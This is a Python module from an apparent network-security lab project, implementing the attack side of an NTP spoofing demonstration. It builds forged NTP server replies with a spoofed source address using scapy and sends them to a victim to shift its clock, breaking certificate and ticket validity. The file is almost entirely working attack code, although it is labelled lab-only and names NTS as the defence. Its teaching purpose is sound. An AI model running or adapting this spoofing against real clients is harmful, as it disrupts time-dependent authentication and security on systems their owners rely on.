# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-ntp: forge an NTP reply to shift a victim's clock. LAB ONLY.

Answers the victim's NTP query with a time far in the past/future so validity
windows (certs, tickets) break. Only ever target a client you own; NTS (see
clock.py) authenticates the time source.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    # NTP era offset (1900) + desired unix-ish time shifted by --offset
    reply = (
        s.IP(src=args.server, dst=args.victim)
        / s.UDP(sport=123, dport=123)
        / s.NTP(version=4, mode=4, stratum=1, ref=0, orig=0, recv=0, sent=args.offset)
    )
    print(f"[*] forging NTP reply to {args.victim} shifting the clock (sent={args.offset})")
    s.send(reply, count=args.count, verbose=0)
    verdict("ALERT", f"forged time pushed to {args.victim}")
    return 0
